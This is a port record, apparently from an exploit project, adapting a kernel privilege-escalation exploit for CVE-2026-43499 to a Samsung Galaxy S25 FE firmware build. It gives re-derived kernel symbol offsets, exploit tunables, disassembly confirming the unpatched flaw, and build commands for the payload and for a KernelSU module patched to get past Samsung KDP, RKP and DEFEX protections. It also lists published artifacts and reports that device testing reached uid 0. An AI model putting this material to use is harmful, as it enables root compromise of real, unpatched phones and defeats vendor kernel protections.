# Galaxy S25 FE SM-S731B / S731BXXU9CZIF port record

This record documents the port of CVE-2026-43499 to the Galaxy S25 FE
International variant (`SM-S731B`, firmware `S731BXXU9CZIF`, One UI 9, region
OXM). It supersedes the BZH1 profile for devices that have taken the One UI 9
update; the BZH1 entry stays in the feed for devices still on the older build.

Unlike the BZH1 port, this kernel is **not** the same binary as BZF3. Every
firmware-dependent constant was re-derived from the CZIF Image.

## Device identity

| Field | Value |
| --- | --- |
| Model | `SM-S731B` |
| Codename | `r13s` (product `r13sxxx`) |
| SoC | Exynos 2400 (Samsung, `s5e9945`) |
| Display build | `CP2A.260605.016.S731BXXU9CZIF` |
| Build fingerprint | `samsung/r13sxxx/r13s:17/CP2A.260605.016/S731BXXU9CZIF_OXM9CZIF:user/release-keys` |
| Kernel release | `6.1.162-android14-11` |
| Kernel build | `#1 SMP PREEMPT Sat Sep 19 08:48:26 UTC 2026` |
| Android SDK | 37 (Android 17, One UI 9) |
| Page size | 4096 |
| Region / CSC | `EUY` / OXM |
| ADB serial | `R5CYA0Q7AYL` |

Boot image extraction:

| Object | Size | SHA-256 |
| --- | ---: | --- |
| `boot.img` | 67,108,864 | — |
| raw kernel Image | 38,832,640 | `17BB5C34AF25C1A94B478DCEE6308B158341AAA7E23EDC6DB39B5AF3C5B3C0F2` |
| `vmlinux.elf` | 44,372,150 | — |

The ARM64 Image header is `text_offset=0x0`, `image_size=0x27b0000`,
`flags=0xa` — identical to BZH1/BZF3, so the physical load stays
`P0_KERNEL_PHYS_LOAD = 0x80000000`.

## CVE-2026-43499 is still unpatched in CZIF

The kernel advanced `6.1.157` → `6.1.162`, but `remove_waiter()` in
`kernel/locking/rtmutex.c` is **byte-for-byte identical** to the vulnerable
BZH1/BZF3 build; only its address moved (`0xffffffc009120754` →
`0xffffffc00912517c`).

The upstream fix reads the owning task out of `waiter->task` and scrubs
`waiter_task->pi_blocked_on`, and passes `waiter_task` (not `current`) to
`rt_mutex_adjust_prio_chain()`. None of that is present in CZIF:

```text
ffffffc0091251b4: d5384114   mrs x20, SP_EL0            ; x20 = current
ffffffc009125208: f904aa9f   str xzr, [x20, #0x950]     ; current->pi_blocked_on = NULL
ffffffc009125374: aa1403e5   mov x5, x20                ; chain walk still gets current
ffffffc009125378: 9400015c   bl  rt_mutex_adjust_prio_chain
```

The function contains exactly one `pi_blocked_on` scrub and never loads
`waiter->task` at offset `0x30`. `CONFIG_FUTEX_PI=y` is set and
`futex_wait_requeue_pi` / `futex_lock_pi` / `rt_mutex_futex_unlock` are all
present with live `remove_waiter` call sites.

The live kernel configuration also has `CONFIG_RANDOMIZE_KSTACK_OFFSET=y`, but
`# CONFIG_RANDOMIZE_KSTACK_OFFSET_DEFAULT is not set`, so the kstack offset
randomisation (which the GhostLock researchers note would degrade stack-reclaim
reliability) is off unless the boot command line enables it.

## Target profile: `r13s-S731BXXU9CZIF`

Profile resides at `src/targets/r13s-S731BXXU9CZIF/target.h`.

Re-derived symbol offsets (from `KIMAGE_TEXT_BASE = 0xffffffc008000000`):

| Macro | Symbol | CZIF offset |
| --- | --- | ---: |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | `call_usermodehelper_exec_work` | `0x000d4584` |
| `NOOP_LLSEEK_OFF` | `noop_llseek` | `0x003a1db0` |
| `COPY_SPLICE_READ_OFF` | `generic_file_splice_read` | `0x003efdbc` |
| `CONFIGFS_READ_ITER_OFF` | `configfs_read_iter` | `0x00471bd4` |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | `configfs_bin_write_iter` | `0x00472104` |
| `ASHMEM_IOCTL_OFF` | `ashmem_ioctl` | `0x00d3e28c` |
| `ASHMEM_COMPAT_IOCTL_OFF` | `compat_ashmem_ioctl` | `0x00d3ebc4` |
| `ASHMEM_MMAP_OFF` | `ashmem_mmap` | `0x00d3ec1c` |
| `ASHMEM_OPEN_OFF` | `ashmem_open` | `0x00d3ee48` |
| `ASHMEM_RELEASE_OFF` | `ashmem_release` | `0x00d3eed0` |
| `ASHMEM_SHOW_FDINFO_OFF` | `ashmem_show_fdinfo` | `0x00d3eff0` |
| `ANON_PIPE_BUF_OPS_OFF` | `anon_pipe_buf_ops` | `0x0121d890` |
| `ASHMEM_FOPS_OFF` | `ashmem_fops` | `0x013da288` |
| `KMALLOC_CACHES_OFF` | `kmalloc_caches` | `0x017aa0f8` |
| `SYSTEM_UNBOUND_WQ_OFF` | `system_unbound_wq` | `0x022eac58` |
| `INIT_TASK_OFF` | `init_task` | `0x022ff640` |
| `ROOT_TASK_GROUP_OFF` | `root_task_group` | `0x02515cc0` |
| `SELINUX_ENFORCING_OFF` | `selinux_state.enforcing` | `0x025ea4a8` |
| `SYSCTL_BOOTID_OFF` | `sysctl_bootid` | `0x026cd620` |
| `ASHMEM_MISC_OFF` | `ashmem_miscs` | `0x02484db0` |
| `ASHMEM_MUTEX_OFF` | `ashmem_mutex` | `0x02484d10` |
| `ASHMEM_SHRINKER_OFF` | `ashmem_shrinker` | `0x02484d40` |
| `ASHMEM_SHRINK_WAIT_OFF` | `ashmem_shrink_wait` | `0x02484d80` |
| `ASHMEM_LRU_LIST_OFF` | `ashmem_lru_list` | `0x02484da0` |
| `SLIDE_NFULNL_LOGGER_NAME_OFF` | `"nfnetlink_log"` string | `0x016def17` |
| `SLIDE_NFULNL_LOGGER_OBJECT_OFF` | `nfulnl_logger` | `0x022f2810` |
| `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` | `boot_id` ctl_table `.data` | `0x0243efa0` |
| `SLIDE_TRACEFS_WORKER_CALLER_OFF` | `worker_thread` after `bl schedule` | `0x000dbeb8` |

Derivation cross-checks:

- The `boot_id` `.data` pointer at `0x0243efa0` holds `0xffffffc00a6cd620`
  (`sysctl_bootid`), matching the BZH1 relationship at `0x0243eff8`.
- `SLIDE_TRACEFS_EVENT_ID` is `106`:
  `(__event_sched_blocked_reason - __start_ftrace_events) / 8 + 20 = 86 + 20`.
- `SLIDE_NFULNL_LOGGER_OBJECT_OFF`'s first qword resolves to the
  `"nfnetlink_log"` string at `0x016def17`.

### Struct and code-layout equivalence

The exploit paths and every layout it depends on are unchanged from the
device-verified BZH1 build:

- The target BTF (extracted from the CZIF raw Image) reports identical member
  offsets and sizes for `task_struct`, `file_operations`, `page`, `mm_struct`,
  `rt_mutex_waiter`, `miscdevice`, `pipe_buffer`, `pipe_inode_info`,
  `ctl_table`, and `file` as the BZH1 BTF.
- `remove_waiter`, `task_blocks_on_rt_mutex`, `rt_mutex_adjust_prio_chain`,
  `futex_wait_requeue_pi`, `futex_lock_pi`, `__arm64_sys_pselect6`,
  `core_sys_select`, `do_select`, `__arm64_sys_select`, `pipe_read`,
  `pipe_write`, `configfs_read_iter`, `configfs_bin_write_iter`,
  `ashmem_ioctl`/`mmap`/`open`/`release`, `noop_llseek`,
  `call_usermodehelper_exec_work` and `worker_thread` disassemble to identical
  instruction streams in both kernels (only addresses and symbol annotations
  differ).

Because of that, the stack-layout tunables carry over unchanged:

| Parameter | Value |
| --- | --- |
| `SLIDE_PSELECT_WORD_SHIFT` | 3 |
| `SKB_DATA_DELTA` | `-0x1000` |
| `P0_PHYS_OFFSET` / `P0_KERNEL_PHYS_LOAD` | `0x80000000` |
| `KIMAGE_TEXT_BASE` | `0xffffffc008000000` |
| `MM_STRUCT_SZ` / `MM_ORDER` | `0x400` / 3 |
| `DEFAULT_EXPLOIT_ATTEMPTS` | 1 |
| `APP_REQUIRE_FRESH_P0_SESSION` | 1 |

The P0 fingerprint is generated from the CZIF Image and is **different** from
the BZH1 table (the two kernels have different early text):

```sh
perl tools/generate_p0_fingerprint.pl kernel 0x1f0000 \
  src/targets/r13s-S731BXXU9CZIF/p0_fingerprint.h
```

## KernelSU

The KernelSU module is the `r13s` 6.1 no-patch-text Samsung KDP/RKP/DEFEX build,
rebuilt from source for the CZIF release with the same DDK image used for the
other 6.1 targets, `ghcr.io/ylarod/ddk-min:android14-6.1-20260313`, with the
DDK's generated release replaced by the target release:

```sh
docker run --rm \
  -v "$PWD:/workspace" -w /workspace/kernel \
  ghcr.io/ylarod/ddk-min:android14-6.1-20260313 \
  bash -lc '
    sed -i "s/6.1.166-dirty/6.1.162-android14-11/g" \
      "$KDIR/include/generated/utsrelease.h" \
      "$KDIR/include/config/kernel.release"
    make clean
    CONFIG_KSU=m CONFIG_KSU_SAMSUNG_KDP=y CONFIG_KSU_SAMSUNG_RKP=y \
    CONFIG_KSU_SAMSUNG_DEFEX=y CC=clang make -j$(nproc)
  '
```

`kernel/check_symbol` against the recovered CZIF `vmlinux.elf` reports no
discrepancies, and the manual-relocation audit against the CZIF kernel and
CZIF-derived `Module.symvers` is clean:

```sh
python3 kernelsu/tools/extract_target_symvers.py vmlinux.elf Module.symvers
python3 kernelsu/tools/audit_module_against_target.py \
  kernelsu/android14-6.1_kernelsu-r13s-S731BXXU9CZIF-kdp.ko \
  vmlinux.elf Module.symvers --manual-relocation
```

Result:

```text
undefined symbols: 209
module version entries: 0
missing from target symbol table: 0
symbols resolved from kallsyms rather than target exports: 50
undefined symbols intentionally without module CRC: 209
target CRC mismatches: 0
```

`modinfo` reports the exact target release:

```text
vermagic: 6.1.162-android14-11 SMP preempt mod_unload modversions aarch64
name:     kernelsu
```

### ksud

`ksud` must be rebuilt because it embeds the module as a `rust-embed`
(deflate-compressed) asset; a plain string patch is not possible. It was built
from KernelSU `v3.2.5` (`b0bc817b4e966aa6aa830834eaf6ef765d821d40`) with
`patches/KernelSU-v3.2.5-samsung-kdp-rkp-defex.patch` applied cleanly, and the
freshly built module staged at
`userspace/ksud/bin/aarch64/android14-6.1_kernelsu.ko`.

Four upstream dependency repositories (`Kernel-SU/adb_client`,
`Kernel-SU/ksu_props`, `Kernel-SU/java-properties`, `Kernel-SU/rustix`) have
been deleted from GitHub, so the build was pointed at surviving equivalents:

```text
adb_client        -> https://github.com/Baka-SU/adb_client (same revision d97a9664)
prop-rs-android   -> https://github.com/Baka-SU/ksu_props
java-properties   -> crates.io 2.0.0
rustix            -> crates.io 0.38.34
```

Build:

```sh
export ANDROID_NDK_HOME=/path/to/android-ndk-r27
export LIBCLANG_PATH=/usr/lib
cargo build --release --target aarch64-linux-android -p ksud
```

The embedded asset was verified by recompressing the staged module with the same
`libflate` deflate encoder (`include-flate` 0.3.4) and confirming an exact,
full-length byte match at `0x5c410` of the stripped binary.

## Build

```sh
ANDROID_NDK_HOME=/path/to/android-ndk-r27 make TARGET=r13s-S731BXXU9CZIF
```

Verified with NDK `27.0.12077973`, API 35.

## Artifacts

| File | Size | SHA-256 |
| --- | ---: | --- |
| `artifacts/r13s-S731BXXU9CZIF/cve-2026-43499-app.so` | 152,336 | `940fda3528a7a3cb33eef1c43cde345d35b5549e0a0be57f14c37842cd521015` |
| `artifacts/r13s-S731BXXU9CZIF/cve-2026-43499-root` | 26,960 | `1d5750239bc0c8db5040183af00cbd90f4fe9114d8e1581de77237da6f5cbf63` |
| `kernelsu/android14-6.1_kernelsu-r13s-S731BXXU9CZIF-kdp.ko` | 398,336 | `13fd97a8d303c63c8a3df5d70ad93f8fd311aec927a1dcdef1c3c004d492fd2f` |
| `kernelsu/ksud-r13s-S731BXXU9CZIF-kdp` | 4,602,440 | `5cd19258692d87743a92078b25b40974d07e30a4f7e7dbeb10777ae039db7c7c` |

The published `cve-2026-43499-app.so` is the plain `APP_PRELOAD` output, matching
the BZH1/BZF3 publication convention.

The `cve-2026-43499-app.so` above was rebuilt at commit `fb540242d2ae`
("r13s: fix gate_holder Q refcount to prevent put_page crash on lock"). The
`compensate_refcount()` repair no longer runs through the pipe physical R/W
helpers, which cannot reach vmemmap addresses, and instead uses
`configfs_read_once`/`configfs_write_once` against `p0_gate_page_struct` and
`p0_probe_page_struct`. The `cve-2026-43499-root` helper is unaffected: its
source (`src/su_daemon.c`) is unchanged, so the rebuilt binary is byte-identical
to the previously published one.

## Status

The profile, payload, module and `ksud` are build-verified, statically audited
against the CZIF kernel, and device-tested on a `SM-S731B` running
`S731BXXU9CZIF`. The exploit reached uid 0, the module loaded without the
live-patching panic, and the KernelSU late-load completed.

## Notes and limitations

- The module **must** be built with `CONFIG_KSU_SAMSUNG_NO_PATCH_TEXT=y`. On this
  Exynos 2400 SoC the live text patching path (`stop_machine()` in
  `ksu_patch_text()`) panics in Samsung/Exynos EL2 and reboots the device. A
  build without the flag gets as far as the first patch attempt and reboots.
  Every working Samsung 6.1 module in this repo (BZH1, E1S, E2S) is a
  no-patch-text build; the marker string `patch_text disabled for this Samsung
  target` proves which variant a given `.ko` is.
- The KernelSU module and `ksud` are device-tested as well as statically
  audited against the recovered CZIF `vmlinux`.
- Root is per-boot; no boot image was modified.
- MTE is active on this SoC, so the profile sets `KERNELSNITCH_MTE_ENABLED=1`.
- `ksud` carries the `--ephemeral` flag that `su_daemon.c` passes to
  `late-load`. That flag is **not** upstream KernelSU: the shipped BZH1/BZF3
  `ksud-*-kdp` binaries embed an unpublished private patch, and the bundled
  `KernelSU-v3.2.5-samsung-kdp-rkp-defex.patch` does not contain it. The CZIF
  `ksud` was rebuilt after reconstructing that patch: a `--ephemeral` argument
  on the `LateLoad` clap command that skips `utils::stage_daemon_from()` and
  `utils::finish_install()`, both of which write into `/data/adb` and are
  blocked by Samsung DEFEX Immutable Root v2. Without it, `late-load` aborts at
  the first step with `Failed to stage ksud` before the module loads.
